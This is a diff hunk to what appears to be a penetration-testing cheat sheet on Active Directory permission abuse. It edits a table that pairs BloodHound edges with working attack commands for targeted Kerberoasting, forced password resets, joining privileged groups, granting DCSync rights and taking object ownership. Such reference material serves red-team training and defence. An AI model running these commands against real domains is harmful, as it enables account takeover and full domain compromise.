@@ -130,7 +130,7 @@ Pick the edge BloodHound drew; run its recipe. All of these turn a *write right*
 |---|---|---|
 | **GenericAll / GenericWrite on a user** | Targeted Kerberoast: `targetedKerberoast.py -v -d $DOMAIN -u $USER -p $PASS` (sets temp SPN, roasts, cleans up) | Crackable TGS for that user |
 | GenericAll/GenericWrite on a user (alt) | `net rpc password "victim" "NewPass123!" -U "$DOMAIN/$USER%$PASS" -S $DC_IP` | Reset the victim's password |
-| **ForceChangePassword** | `nxc smb $DC_IP -u $USER -p $PASS -M change-password -o USER=victim NEWPASS=New123!` or `bloodyAD ... set password` | You own the victim account |
+| **ForceChangePassword** | `bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC_IP set password victim 'New123!'` or `net rpc password victim 'New123!' -U "$DOMAIN/$USER%$PASS" -S $DC_IP` | You own the victim account |
 | **AddMember** (over a group) | `bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC_IP add groupMember "Target Group" $USER` | Add yourself to a privileged group |
 | **WriteDACL** (over domain/object) | `impacket-dacledit -action write -rights DCSync -principal $USER -target-dn "$DOMAIN_DN" $DOMAIN/$USER:$PASS` | Grant yourself **DCSync** → §M |
 | **WriteOwner** | `impacket-owneredit -action write -new-owner $USER -target victim ...` then grant yourself rights | Take ownership, then abuse |
